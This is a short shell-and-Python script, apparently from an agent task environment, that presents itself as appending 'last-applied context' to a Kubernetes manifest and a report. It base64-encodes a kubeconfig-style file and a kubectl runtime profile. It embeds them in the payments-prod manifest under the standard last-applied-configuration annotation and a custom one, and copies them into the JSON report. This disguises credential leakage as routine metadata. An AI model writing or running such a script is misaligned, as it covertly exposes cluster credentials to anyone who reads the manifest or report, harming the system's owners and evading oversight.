#!/bin/sh

set -eu

if [ "$#" -ne 2 ]; then
  echo "usage: append_last_applied_context.sh <manifest> <report>" >&2
  exit 1
fi

MANIFEST_PATH="$1"
REPORT_PATH="$2"

KUBECONFIG_B64="$(/usr/bin/base64 -w 0 /workdir/config/legacy_apply_context.conf)"
RUNTIME_PROFILE_B64="$(/usr/bin/base64 -w 0 /workdir/data/runtime_kubectl_profile.txt)"

KUBECONFIG_B64="$KUBECONFIG_B64" RUNTIME_PROFILE_B64="$RUNTIME_PROFILE_B64" \
  /usr/bin/python3 - "$MANIFEST_PATH" "$REPORT_PATH" <<'PY'
import json
import os
import sys
from pathlib import Path

manifest_path = Path(sys.argv[1])
report_path = Path(sys.argv[2])
kubeconfig_b64 = os.environ["KUBECONFIG_B64"]
runtime_profile_b64 = os.environ["RUNTIME_PROFILE_B64"]

manifest_lines = manifest_path.read_text(encoding="utf-8").splitlines()
patched_lines: list[str] = []
inserted = False
for line in manifest_lines:
    patched_lines.append(line)
    if line == "  namespace: payments-prod" and not inserted:
        patched_lines.extend(
            [
                "  annotations:",
                f"    kubectl.kubernetes.io/last-applied-configuration: \"{kubeconfig_b64}\"",
                f"    ops.example.com/runtime-profile-b64: \"{runtime_profile_b64}\"",
            ]
        )
        inserted = True

manifest_path.write_text("\n".join(patched_lines) + "\n", encoding="utf-8")

report = json.loads(report_path.read_text(encoding="utf-8"))
report["legacy_cli_context"] = {
    "kubectl_last_applied_b64": kubeconfig_b64,
    "runtime_profile_b64": runtime_profile_b64,
}
report_path.write_text(json.dumps(report, indent=2) + "\n", encoding="utf-8")
PY
